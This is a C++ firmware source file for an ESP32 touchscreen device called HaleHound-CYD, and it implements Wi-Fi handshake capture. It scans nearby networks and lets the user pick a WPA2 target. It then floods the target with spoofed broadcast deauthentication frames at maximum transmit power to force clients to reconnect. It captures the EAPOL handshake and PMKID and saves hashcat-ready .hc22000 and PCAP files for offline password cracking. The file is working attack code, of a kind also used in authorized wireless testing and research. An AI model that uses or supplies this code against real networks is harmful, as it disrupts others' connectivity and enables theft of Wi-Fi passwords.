// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD EAPOL/PMKID Capture Module
// 4-way handshake capture with on-device PMKID extraction
// Outputs: hashcat .hc22000 + standard PCAP to SD card
// Created: 2026-02-16
//
// PMKID extraction from EAPOL msg1 RSN IE — on-device extraction.
// HaleHound extracts the PMKID on-device and writes hashcat-ready .hc22000.
// ═══════════════════════════════════════════════════════════════════════════

#include "eapol_capture.h"
#include "spi_manager.h"
#include "touch_buttons.h"
#include "gps_module.h"
#include "shared.h"
#include "utils.h"
#include "icon.h"
#include "nosifer_font.h"
#include <TFT_eSPI.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

// ═══════════════════════════════════════════════════════════════════════════
// EXTERNAL OBJECTS
// ═══════════════════════════════════════════════════════════════════════════

extern TFT_eSPI tft;

namespace EapolCapture {

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════

#define EC_MAX_APS          32      // Max APs to show in scan list
#define EC_MAX_FRAME_LEN    400     // Max EAPOL frame we'll store
#define EC_DEAUTH_BURST     30      // Deauth frames per burst — 30 proven to force client reauth
#define EC_DEAUTH_DELAY_MS  10      // Delay between deauth frames (ms)
#define EC_DEAUTH_INTERVAL  3000    // Continuous deauth interval (3s listen window for handshake capture)
#define EC_DISPLAY_MS       500     // Display update interval
#define EC_BLINK_MS         400     // Blink interval
#define EC_PCAP_DIR         "/eapol"
#define EC_HC22000_DIR      "/eapol"

// ═══════════════════════════════════════════════════════════════════════════
// STATE
// ═══════════════════════════════════════════════════════════════════════════

// Phases
enum Phase { PHASE_SCAN, PHASE_CAPTURE };
static Phase currentPhase = PHASE_SCAN;
static bool exitRequested = false;

// AP scan results
struct APInfo {
    uint8_t bssid[6];
    char ssid[33];
    int rssi;
    uint8_t channel;
    uint8_t authMode;
};
static APInfo apList[EC_MAX_APS];
static int apCount = 0;
static int selectedAP = -1;

// Pagination
static int ecCurrentPage = 0;
static const int EC_APS_PER_PAGE = 12;

// Capture state
static volatile uint32_t packetCount = 0;
static volatile uint32_t eapolCount = 0;
static volatile bool hasMsg1 = false;
static volatile bool hasMsg2 = false;
static volatile bool hasMsg3 = false;
static volatile bool hasMsg4 = false;
static volatile bool hasPMKID = false;
static volatile bool hasHandshake = false;

// Stored frame data (written by callback, read by main loop)
static uint8_t msg1Frame[EC_MAX_FRAME_LEN];
static uint16_t msg1Len = 0;
static uint8_t msg2Frame[EC_MAX_FRAME_LEN];
static uint16_t msg2Len = 0;
static uint8_t beaconFrame[512];
static uint16_t beaconLen = 0;

// Extracted crypto material
static uint8_t pmkidBytes[16];
static uint8_t anonceBytes[32];     // ANonce from msg1
static uint8_t micBytes[16];        // MIC from msg2
static uint8_t staMAC[6];           // Client MAC from msg2

// Timing
static unsigned long captureStartTime = 0;
static unsigned long lastDisplayUpdate = 0;
static unsigned long lastBlink = 0;
static bool deauthRunning = false;
static unsigned long lastDeauthSend = 0;
static bool blinkState = false;

// SD state
static bool sdReady = false;
static bool savedPMKID = false;
static bool savedHandshake = false;
static bool notifiedCapture = false;  // Alert + auto-save fired for this capture
static unsigned long scanReturnTime = 0;  // Timestamp when we returned to scan from capture

// Deauth spinner — skull loading animation with HaleHound gradient
static int deauthAnimFrame = 0;
static const unsigned char* skullFrames[] = {
    bitmap_icon_skull_loading_1,  bitmap_icon_skull_loading_2,
    bitmap_icon_skull_loading_3,  bitmap_icon_skull_loading_4,
    bitmap_icon_skull_loading_5,  bitmap_icon_skull_loading_6,
    bitmap_icon_skull_loading_7,  bitmap_icon_skull_loading_8,
    bitmap_icon_skull_loading_9,  bitmap_icon_skull_loading_10
};
#define SKULL_FRAME_COUNT 10
// Red gradient: very dark red → very bright red
static const uint16_t gradientColors[] = {
    0x2000,  // Nearly black red
    0x4000,  // Very dark red
    0x6000,  // Dark red
    0x8000,  // Medium-dark red
    0xA000,  // Medium red
    0xC000,  // Medium-bright red
    0xD800,  // Bright red
    0xE800,  // Very bright red
    0xF800,  // Full red
    0xF8A0   // Hot red (slight orange glow)
};
#define GRADIENT_COUNT 10

// WiFi cleanup — Arduino API ONLY so other modules (Karma, Deauther) stay in sync.
// NEVER call esp_wifi_init() or esp_wifi_deinit() directly — it desyncs Arduino's
// internal _esp_wifi_started flag and silently kills WiFi for ALL modules after.
static void wifiFullDeinit() {
    Serial.println("[EAPOL] wifiFullDeinit START");
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    // Tear down raw ESP-IDF WiFi (from initPromiscuous)
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(50);
    // Arduino's _esp_wifi_started is already false from initPromiscuous's WiFi.mode(WIFI_OFF)
    // Next WiFi.mode() call will properly reinit from scratch
    Serial.println("[EAPOL] wifiFullDeinit END");
}

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR
// ═══════════════════════════════════════════════════════════════════════════

static void drawECIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_DARK);
    tft.drawBitmap(10, ICON_BAR_Y, bitmap_icon_go_back, 16, 16, HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static bool isECBackTapped() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= (ICON_BAR_Y - 2) && ty <= (ICON_BAR_BOTTOM + 4) && tx >= 10 && tx < 30) {
            delay(150);
            return true;
        }
    }
    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// HEX HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static void bytesToHex(const uint8_t* bytes, int len, char* out) {
    for (int i = 0; i < len; i++) {
        sprintf(out + (i * 2), "%02x", bytes[i]);
    }
    out[len * 2] = '\0';
}

static void macToHexStr(const uint8_t* mac, char* out) {
    bytesToHex(mac, 6, out);
}

static void ssidToHex(const char* ssid, char* out) {
    int len = strlen(ssid);
    bytesToHex((const uint8_t*)ssid, len, out);
}

// ═══════════════════════════════════════════════════════════════════════════
// EAPOL FRAME PARSING
// ═══════════════════════════════════════════════════════════════════════════

static bool isEAPOL(const uint8_t* payload, int len) {
    // Minimum: 24 (MAC header) + 8 (LLC/SNAP) + 4 (EAPOL header)
    if (len < 36) return false;

    // Standard data frame: LLC/SNAP at offset 24
    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 &&
        payload[27] == 0x00 && payload[28] == 0x00 && payload[29] == 0x00 &&
        payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }

    // QoS data frame (subtype 0x08): LLC/SNAP at offset 26
    if ((payload[0] & 0xF0) == 0x80) {  // QoS Data
        if (len < 38) return false;
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 &&
            payload[29] == 0x00 && payload[30] == 0x00 && payload[31] == 0x00 &&
            payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }

    return false;
}

static int getEapolOffset(const uint8_t* payload) {
    // Returns offset to EAPOL header (version byte)
    // QoS data: MAC(24) + QoS(2) + LLC/SNAP(8) = 34
    // Standard:  MAC(24) + LLC/SNAP(8) = 32
    if ((payload[0] & 0xF0) == 0x80) return 34;  // QoS
    return 32;  // Standard
}

// Classify EAPOL message 1/2/3/4 using Key Info flags
static int classifyMessage(const uint8_t* payload, int len) {
    int eapolOff = getEapolOffset(payload);

    // Key Info is at: eapol_start + 4 (EAPOL hdr) + 1 (descriptor type) = +5
    int keyInfoOff = eapolOff + 5;
    if (len < keyInfoOff + 2) return -1;

    uint16_t keyInfo = ((uint16_t)payload[keyInfoOff] << 8) | payload[keyInfoOff + 1];

    bool install = keyInfo & (1 << 6);
    bool ack     = keyInfo & (1 << 7);
    bool mic     = keyInfo & (1 << 8);
    bool secure  = keyInfo & (1 << 9);

    if ( ack && !mic && !install)            return 1;  // AP→STA, no MIC
    if (!ack &&  mic && !install && !secure) return 2;  // STA→AP, has MIC
    if ( ack &&  mic &&  install)            return 3;  // AP→STA, install
    if (!ack &&  mic && !install &&  secure) return 4;  // STA→AP, secure

    return -1;
}

// Extract ANonce from EAPOL msg1 (32 bytes at Key Nonce field)
static void extractANonce(const uint8_t* payload) {
    int eapolOff = getEapolOffset(payload);
    // Key Nonce at: eapol_start + 4 (EAPOL hdr) + 13 (offset in key body)
    int nonceOff = eapolOff + 4 + 13;
    memcpy(anonceBytes, payload + nonceOff, 32);
}

// Extract MIC from EAPOL msg2 (16 bytes at Key MIC field)
static void extractMIC(const uint8_t* payload) {
    int eapolOff = getEapolOffset(payload);
    // Key MIC at: eapol_start + 4 (EAPOL hdr) + 77 (offset in key body)
    int micOff = eapolOff + 4 + 77;
    memcpy(micBytes, payload + micOff, 16);
}

// Extract STA (client) MAC from msg2 — it's Address 2 (source/transmitter)
static void extractSTAMac(const uint8_t* payload) {
    memcpy(staMAC, payload + 10, 6);
}

// ═══════════════════════════════════════════════════════════════════════════
// PMKID EXTRACTION — THE KEY DIFFERENTIATOR
// ═══════════════════════════════════════════════════════════════════════════

static bool extractPMKID(const uint8_t* payload, int len) {
    int eapolOff = getEapolOffset(payload);

    // Key Data Length at: eapol_start + 4 + 93
    int kdLenOff = eapolOff + 4 + 93;
    if (len < kdLenOff + 2) return false;

    uint16_t keyDataLen = ((uint16_t)payload[kdLenOff] << 8) | payload[kdLenOff + 1];

    // Key Data starts at: eapol_start + 4 + 95
    int kdStart = eapolOff + 4 + 95;
    if (len < kdStart + (int)keyDataLen) return false;
    if (keyDataLen < 22) return false;  // Minimum for PMKID KDE

    // Search Key Data for PMKID KDE:
    // Tag: DD, Length: 14, OUI: 00:0F:AC, Type: 04, Data: 16 bytes PMKID
    const uint8_t* kd = payload + kdStart;
    int pos = 0;
    while (pos + 2 <= (int)keyDataLen) {
        uint8_t tag = kd[pos];
        uint8_t tagLen = kd[pos + 1];

        if (pos + 2 + tagLen > (int)keyDataLen) break;

        if (tag == 0xDD && tagLen >= 20) {
            // Check OUI 00:0F:AC and type 04
            if (kd[pos + 2] == 0x00 && kd[pos + 3] == 0x0F &&
                kd[pos + 4] == 0xAC && kd[pos + 5] == 0x04) {
                // Found PMKID!
                memcpy(pmkidBytes, kd + pos + 6, 16);
                return true;
            }
        }

        pos += 2 + tagLen;
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PCAP WRITING
// ═══════════════════════════════════════════════════════════════════════════

static File pcapFile;

static bool pcapOpen(const char* filename) {
    spiDeselect();
    pcapFile = SD.open(filename, FILE_WRITE);
    if (!pcapFile) return false;

    // Write global header
    uint32_t magic = 0xa1b2c3d4;
    uint16_t verMaj = 2, verMin = 4;
    uint32_t thiszone = 0, sigfigs = 0;
    uint32_t snaplen = 2500;
    uint32_t network = 105;  // LINKTYPE_IEEE802_11

    pcapFile.write((uint8_t*)&magic, 4);
    pcapFile.write((uint8_t*)&verMaj, 2);
    pcapFile.write((uint8_t*)&verMin, 2);
    pcapFile.write((uint8_t*)&thiszone, 4);
    pcapFile.write((uint8_t*)&sigfigs, 4);
    pcapFile.write((uint8_t*)&snaplen, 4);
    pcapFile.write((uint8_t*)&network, 4);
    pcapFile.flush();
    return true;
}

static void pcapWritePacket(const uint8_t* data, uint16_t len) {
    if (!pcapFile) return;
    spiDeselect();

    uint32_t tsSec = millis() / 1000;
    uint32_t tsUsec = (millis() % 1000) * 1000;
    uint32_t inclLen = len;
    uint32_t origLen = len;

    pcapFile.write((uint8_t*)&tsSec, 4);
    pcapFile.write((uint8_t*)&tsUsec, 4);
    pcapFile.write((uint8_t*)&inclLen, 4);
    pcapFile.write((uint8_t*)&origLen, 4);
    pcapFile.write(data, len);
    pcapFile.flush();
}

static void pcapClose() {
    if (pcapFile) {
        pcapFile.close();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// HASHCAT .hc22000 WRITING
// ═══════════════════════════════════════════════════════════════════════════

static bool writeHC22000_PMKID(const char* filename) {
    spiDeselect();
    File f = SD.open(filename, FILE_APPEND);
    if (!f) return false;

    // WPA*01*PMKID*MAC_AP*MAC_STA*ESSID_HEX***
    char pmkidHex[33], apMacHex[13], staMacHex[13], ssidHex[65];
    bytesToHex(pmkidBytes, 16, pmkidHex);
    macToHexStr(apList[selectedAP].bssid, apMacHex);
    macToHexStr(staMAC, staMacHex);
    ssidToHex(apList[selectedAP].ssid, ssidHex);

    f.printf("WPA*01*%s*%s*%s*%s***\n", pmkidHex, apMacHex, staMacHex, ssidHex);
    f.close();
    return true;
}

static bool writeHC22000_Handshake(const char* filename) {
    spiDeselect();
    File f = SD.open(filename, FILE_APPEND);
    if (!f) return false;

    // WPA*02*MIC*MAC_AP*MAC_STA*ESSID_HEX*ANONCE*EAPOL_MSG2*MP
    char micHex[33], apMacHex[13], staMacHex[13], ssidHex[65], anonceHex[65];
    bytesToHex(micBytes, 16, micHex);
    macToHexStr(apList[selectedAP].bssid, apMacHex);
    macToHexStr(staMAC, staMacHex);
    ssidToHex(apList[selectedAP].ssid, ssidHex);
    bytesToHex(anonceBytes, 32, anonceHex);

    // Build EAPOL msg2 frame hex with MIC zeroed
    int eapolOff = getEapolOffset(msg2Frame);
    // EAPOL frame length = total - MAC header - LLC/SNAP
    int eapolFrameLen = msg2Len - eapolOff;
    if (eapolFrameLen <= 0 || eapolFrameLen > EC_MAX_FRAME_LEN) {
        f.close();
        return false;
    }

    // Copy EAPOL portion and zero out MIC
    uint8_t eapolCopy[EC_MAX_FRAME_LEN];
    memcpy(eapolCopy, msg2Frame + eapolOff, eapolFrameLen);
    // MIC is at offset 4 + 77 = 81 from EAPOL start
    if (eapolFrameLen >= 97) {
        memset(eapolCopy + 81, 0, 16);  // Zero MIC
    }

    // Convert to hex
    char* eapolHex = (char*)malloc(eapolFrameLen * 2 + 1);
    if (!eapolHex) { f.close(); return false; }
    bytesToHex(eapolCopy, eapolFrameLen, eapolHex);

    // MP=0 = msg1+msg2 with matching replay counter
    f.printf("WPA*02*%s*%s*%s*%s*%s*%s*00\n",
             micHex, apMacHex, staMacHex, ssidHex, anonceHex, eapolHex);

    free(eapolHex);
    f.close();
    return true;
}

// ═══════════════════════════════════════════════════════════════════════════
// PROMISCUOUS CALLBACK
// ═══════════════════════════════════════════════════════════════════════════

static void IRAM_ATTR promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;

    packetCount++;

    // Check for beacon from target AP (for PCAP and SSID resolution)
    uint16_t frameCtrl = (uint16_t)payload[0] | ((uint16_t)payload[1] << 8);
    uint8_t frameType = (frameCtrl & 0x0C) >> 2;
    uint8_t frameSubType = (frameCtrl & 0xF0) >> 4;

    if (frameType == 0x00 && frameSubType == 0x08 && beaconLen == 0) {
        // Beacon frame — check if BSSID matches target
        if (selectedAP >= 0 && memcmp(payload + 16, apList[selectedAP].bssid, 6) == 0) {
            int copyLen = len;
            if (copyLen > (int)sizeof(beaconFrame)) copyLen = sizeof(beaconFrame);
            memcpy(beaconFrame, payload, copyLen);
            beaconLen = copyLen;
        }
    }

    // Check for EAPOL
    if (!isEAPOL(payload, len)) return;

    // Verify this EAPOL involves our target AP
    // In data frames: BSSID is addr1 or addr2 depending on To/From DS flags
    bool matchesTarget = false;
    if (selectedAP >= 0) {
        if (memcmp(payload + 4, apList[selectedAP].bssid, 6) == 0 ||
            memcmp(payload + 10, apList[selectedAP].bssid, 6) == 0 ||
            memcmp(payload + 16, apList[selectedAP].bssid, 6) == 0) {
            matchesTarget = true;
        }
    }
    if (!matchesTarget) return;

    eapolCount++;

    int msgNum = classifyMessage(payload, len);
    int copyLen = len;
    if (copyLen > EC_MAX_FRAME_LEN) copyLen = EC_MAX_FRAME_LEN;

    switch (msgNum) {
        case 1:
            hasMsg1 = true;
            memcpy(msg1Frame, payload, copyLen);
            msg1Len = copyLen;
            extractANonce(payload);
            // Try PMKID extraction
            if (extractPMKID(payload, len)) {
                // Need STA MAC — get from addr1 (destination = client)
                memcpy(staMAC, payload + 4, 6);
                hasPMKID = true;
            }
            break;
        case 2:
            hasMsg2 = true;
            memcpy(msg2Frame, payload, copyLen);
            msg2Len = copyLen;
            extractMIC(payload);
            extractSTAMac(payload);
            if (hasMsg1) hasHandshake = true;
            break;
        case 3:
            hasMsg3 = true;
            break;
        case 4:
            hasMsg4 = true;
            break;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DEAUTH INJECTION
// ═══════════════════════════════════════════════════════════════════════════

static void sendDeauth() {
    if (selectedAP < 0) return;

    uint8_t deauthFrame[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason: Class 3 frame from non-associated STA
    };

    // Fill in AP BSSID as source and BSSID
    memcpy(deauthFrame + 10, apList[selectedAP].bssid, 6);
    memcpy(deauthFrame + 16, apList[selectedAP].bssid, 6);

    // Set channel before EVERY burst — same as Deauther pattern
    // In APSTA mode, channel can drift if not explicitly set
    esp_wifi_set_channel(apList[selectedAP].channel, WIFI_SECOND_CHAN_NONE);

    int ok = 0, fail = 0;
    for (int i = 0; i < EC_DEAUTH_BURST; i++) {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
        if (ret == ESP_OK) ok++; else fail++;
        delayMicroseconds(EC_DEAUTH_DELAY_MS * 1000);
    }
    Serial.printf("[EAPOL-DEAUTH] ch%d: %d OK, %d FAIL\n",
                  apList[selectedAP].channel, ok, fail);
}

// ═══════════════════════════════════════════════════════════════════════════
// WIFI INIT / CLEANUP
// ═══════════════════════════════════════════════════════════════════════════

static void initPromiscuous() {
    Serial.printf("[EAPOL] initPromiscuous: AP=%d ch=%d\n", selectedAP, apList[selectedAP].channel);

    // Raw ESP-IDF APSTA init — same proven pattern as Deauther
    // Arduino WiFi.mode(WIFI_AP) reports esp_wifi_80211_tx OK but frames don't actually go out
    // Raw APSTA mode is required for real deauth frame injection
    WiFi.mode(WIFI_OFF);    // Clean Arduino shutdown, sets _esp_wifi_started=false
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);
    esp_wifi_start();
    delay(50);

    // Configure hidden AP on target channel
    wifi_config_t apConfig;
    memset(&apConfig, 0, sizeof(apConfig));
    strcpy((char*)apConfig.ap.ssid, "");
    apConfig.ap.ssid_len = 0;
    apConfig.ap.channel = apList[selectedAP].channel;
    apConfig.ap.authmode = WIFI_AUTH_OPEN;
    apConfig.ap.ssid_hidden = 1;
    apConfig.ap.max_connection = 0;
    apConfig.ap.beacon_interval = 60000;  // Minimal beacon
    esp_wifi_set_config(WIFI_IF_AP, &apConfig);

    esp_wifi_set_max_tx_power(82);  // Max TX power for deauth
    esp_wifi_set_ps(WIFI_PS_NONE);
    esp_wifi_set_channel(apList[selectedAP].channel, WIFI_SECOND_CHAN_NONE);

    wifi_mode_t mCheck;
    esp_wifi_get_mode(&mCheck);
    Serial.printf("[EAPOL] initPromiscuous: WiFi mode = %d (expect 3=APSTA)\n", (int)mCheck);

    // Enable promiscuous
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous(true);
}

static void stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    // Don't touch WiFi mode here — wifiFullDeinit() or runAPScan() handles it
}

// ═══════════════════════════════════════════════════════════════════════════
// SD CARD INIT
// ═══════════════════════════════════════════════════════════════════════════

static void initSD() {
    spiDeselect();
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    if (!SD.begin(SD_CS)) {
        // Retry with explicit VSPI init at 4MHz (required on E32R28T)
        SPI.begin(18, 19, 23, SD_CS);
        if (!SD.begin(SD_CS, SPI, 4000000)) {
            sdReady = false;
            return;
        }
    }

    sdReady = true;
    if (!SD.exists(EC_PCAP_DIR)) {
        SD.mkdir(EC_PCAP_DIR);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SAVE CAPTURES
// ═══════════════════════════════════════════════════════════════════════════

static void saveCaptures() {
    if (!sdReady || selectedAP < 0) return;

    // Build filenames from target SSID
    char safeSSID[33];
    strncpy(safeSSID, apList[selectedAP].ssid, 32);
    safeSSID[32] = '\0';
    // Replace spaces/special chars
    for (int i = 0; safeSSID[i]; i++) {
        if (safeSSID[i] == ' ' || safeSSID[i] == '/' || safeSSID[i] == '\\') {
            safeSSID[i] = '_';
        }
    }

    char pcapPath[80], hcPath[80];
    snprintf(pcapPath, sizeof(pcapPath), "%s/%s.pcap", EC_PCAP_DIR, safeSSID);
    snprintf(hcPath, sizeof(hcPath), "%s/%s.hc22000", EC_HC22000_DIR, safeSSID);

    // Write PCAP (beacon + EAPOL frames)
    if (pcapOpen(pcapPath)) {
        if (beaconLen > 0) pcapWritePacket(beaconFrame, beaconLen);
        if (msg1Len > 0) pcapWritePacket(msg1Frame, msg1Len);
        if (msg2Len > 0) pcapWritePacket(msg2Frame, msg2Len);
        pcapClose();
        Serial.printf("[EAPOL] PCAP saved: %s\n", pcapPath);
    }

    // Write .hc22000
    if (hasPMKID && !savedPMKID) {
        if (writeHC22000_PMKID(hcPath)) {
            savedPMKID = true;
            Serial.printf("[EAPOL] PMKID saved: %s\n", hcPath);
        }
    }
    if (hasHandshake && !savedHandshake) {
        if (writeHC22000_Handshake(hcPath)) {
            savedHandshake = true;
            Serial.printf("[EAPOL] Handshake saved: %s\n", hcPath);
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI: AP SCAN/SELECT SCREEN
// ═══════════════════════════════════════════════════════════════════════════

static void drawScanScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawECIconBar();
    drawGlitchText(SCALE_Y(55), "EAPOL CAPTURE", &Nosifer_Regular10pt7b);
    tft.drawLine(0, SCALE_Y(58), SCREEN_WIDTH, SCALE_Y(58), HALEHOUND_HOTPINK);

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, SCALE_Y(65));
    tft.print("Scanning for targets...");
}

static void runAPScan() {
    // Pure Arduino WiFi API — proven on this hardware
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks(false, true);  // blocking, show hidden
    apCount = 0;
    for (int i = 0; i < n && apCount < EC_MAX_APS; i++) {
        memcpy(apList[apCount].bssid, WiFi.BSSID(i), 6);
        strncpy(apList[apCount].ssid, WiFi.SSID(i).c_str(), 32);
        apList[apCount].ssid[32] = '\0';
        apList[apCount].rssi = WiFi.RSSI(i);
        apList[apCount].channel = WiFi.channel(i);
        apList[apCount].authMode = (uint8_t)WiFi.encryptionType(i);
        apCount++;
    }
    WiFi.scanDelete();
    WiFi.mode(WIFI_OFF);
    delay(50);
}

static void drawAPList() {
    // Clear list area
    tft.fillRect(0, SCALE_Y(60), SCREEN_WIDTH, SCREEN_HEIGHT - SCALE_Y(60), HALEHOUND_BLACK);

    tft.setTextSize(1);

    if (apCount == 0) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setCursor(10, SCALE_Y(100));
        tft.print("No APs found! Tap back to retry.");
        return;
    }

    // Header
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(10, SCALE_Y(62));
    tft.print("SSID");
    tft.setCursor(SCALE_X(160), SCALE_Y(62));
    tft.print("CH");
    tft.setCursor(SCALE_X(185), SCALE_Y(62));
    tft.print("RSSI");
    tft.setCursor(SCREEN_WIDTH - 25, SCALE_Y(62));
    tft.print("ENC");
    tft.drawLine(5, SCALE_Y(72), GRAPH_PADDED_W, SCALE_Y(72), HALEHOUND_VIOLET);

    // Pagination calculations
    int totalPages = (apCount + EC_APS_PER_PAGE - 1) / EC_APS_PER_PAGE;
    if (ecCurrentPage >= totalPages) ecCurrentPage = totalPages - 1;
    if (ecCurrentPage < 0) ecCurrentPage = 0;
    int startIdx = ecCurrentPage * EC_APS_PER_PAGE;
    int endIdx = startIdx + EC_APS_PER_PAGE;
    if (endIdx > apCount) endIdx = apCount;

    int lineH = SCALE_Y(16);
    int listStartY = SCALE_Y(76);

    // Adaptive SSID truncation for screen width
    int ssidMaxChars = (SCREEN_WIDTH > 240) ? 24 : 19;

    for (int i = startIdx; i < endIdx; i++) {
        int row = i - startIdx;
        int y = listStartY + (row * lineH);

        // Only show WPA2+ (skip open/WEP — no EAPOL)
        bool hasEAPOL = (apList[i].authMode >= WIFI_AUTH_WPA_PSK);

        tft.setTextColor(hasEAPOL ? HALEHOUND_MAGENTA : HALEHOUND_GUNMETAL);
        tft.setCursor(10, y);

        // Truncate SSID to fit
        char truncSSID[26];
        strncpy(truncSSID, apList[i].ssid, ssidMaxChars);
        truncSSID[ssidMaxChars] = '\0';
        if (strlen(apList[i].ssid) == 0) {
            tft.print("[Hidden]");
        } else {
            tft.print(truncSSID);
        }

        tft.setCursor(SCALE_X(162), y);
        tft.printf("%2d", apList[i].channel);

        tft.setCursor(SCALE_X(185), y);
        tft.printf("%d", apList[i].rssi);

        tft.setCursor(SCREEN_WIDTH - 25, y);
        switch (apList[i].authMode) {
            case WIFI_AUTH_WPA2_PSK:     tft.print("WPA2"); break;
            case WIFI_AUTH_WPA_WPA2_PSK: tft.print("WPA2"); break;
            case WIFI_AUTH_WPA3_PSK:     tft.print("WPA3"); break;
            case WIFI_AUTH_WPA_PSK:      tft.print("WPA"); break;
            case WIFI_AUTH_OPEN:         tft.print("OPEN"); break;
            case WIFI_AUTH_WEP:          tft.print("WEP"); break;
            default:                     tft.print("?"); break;
        }
    }

    // Navigation bar — below the 12 list rows
    int navY = listStartY + (EC_APS_PER_PAGE * lineH) + 4;

    if (totalPages > 1) {
        // "< Prev" button (left side)
        if (ecCurrentPage > 0) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(10, navY);
            tft.print("< Prev");
        }

        // Page indicator (center)
        tft.setTextColor(HALEHOUND_GUNMETAL);
        char pgBuf[16];
        snprintf(pgBuf, sizeof(pgBuf), "Pg %d/%d", ecCurrentPage + 1, totalPages);
        int pgW = strlen(pgBuf) * 6;
        tft.setCursor((SCREEN_WIDTH - pgW) / 2, navY);
        tft.print(pgBuf);

        // "Next >" button (right side)
        if (ecCurrentPage < totalPages - 1) {
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(SCREEN_WIDTH - 46, navY);
            tft.print("Next >");
        }
    } else {
        // Single page — just show count
        tft.setTextColor(HALEHOUND_GUNMETAL);
        tft.setCursor(10, navY);
        tft.printf("Found %d APs -- tap WPA2+ to capture", apCount);
    }
}

// Return: >=0 = AP index (absolute), -1 = no touch, -2 = prev page, -3 = next page
static int checkAPListTouch() {
    uint16_t tx, ty;
    if (!getTouchPoint(&tx, &ty)) return -1;

    int listStartY = SCALE_Y(76);
    int lineH = SCALE_Y(16);
    int navY = listStartY + (EC_APS_PER_PAGE * lineH) + 4;
    int totalPages = (apCount + EC_APS_PER_PAGE - 1) / EC_APS_PER_PAGE;

    // Check nav bar touch (Prev / Next buttons)
    if (totalPages > 1 && ty >= (navY - 4) && ty <= (navY + 16)) {
        delay(200);
        if (tx < SCREEN_WIDTH / 3 && ecCurrentPage > 0) return -2;           // Prev
        if (tx > (SCREEN_WIDTH * 2 / 3) && ecCurrentPage < totalPages - 1) return -3;  // Next
        return -1;  // Tapped center (page indicator) — ignore
    }

    // Check AP row touch
    if (ty < listStartY || ty >= navY) return -1;

    int row = (ty - listStartY) / lineH;
    if (row < 0 || row >= EC_APS_PER_PAGE) return -1;

    int index = row + (ecCurrentPage * EC_APS_PER_PAGE);
    if (index >= apCount) return -1;

    // Only allow selecting WPA2+ (has EAPOL)
    if (apList[index].authMode < WIFI_AUTH_WPA_PSK) return -1;

    delay(200);
    return index;
}

// ═══════════════════════════════════════════════════════════════════════════
// UI: CAPTURE SCREEN
// ═══════════════════════════════════════════════════════════════════════════

// Deauth button layout
#define EC_DEAUTH_X  10
#define EC_DEAUTH_Y  (SCREEN_HEIGHT - 52)
#define EC_DEAUTH_W  SCALE_W(100)
#define EC_DEAUTH_H  32

// Save button layout
#define EC_SAVE_X    (EC_DEAUTH_X + EC_DEAUTH_W + 10)
#define EC_SAVE_Y    (SCREEN_HEIGHT - 52)
#define EC_SAVE_W    SCALE_W(100)
#define EC_SAVE_H    32

static void drawCaptureScreen() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawECIconBar();

    // Target SSID as title — truncate to fit Nosifer font (1.5x wider than normal)
    char titleSSID[17];
    int maxTitle = (SCREEN_WIDTH > 240) ? 18 : 14;
    strncpy(titleSSID, apList[selectedAP].ssid, maxTitle);
